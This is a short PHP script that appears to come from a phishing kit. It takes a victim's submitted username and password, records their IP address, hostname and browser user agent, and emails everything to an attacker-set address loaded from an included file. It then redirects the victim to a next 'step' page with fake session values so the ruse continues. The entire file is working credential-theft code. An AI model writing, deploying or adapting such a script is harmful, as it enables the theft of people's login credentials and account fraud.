<?php
if($_POST["id1"] != "" and $_POST["id2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['id1']."\n";
$message .= "Password:  ".$_POST['id2']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------JOK3R THA BLAZ3R --------------|\n";
include 'email.php';
$subject = "Login | $ip";
{
mail("$to", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step.php?cmd=login_submit&id=$praga$praga&session=$praga$praga&email=".$_POST['id1']);
}else{
header ("Location: index.php");
}

?>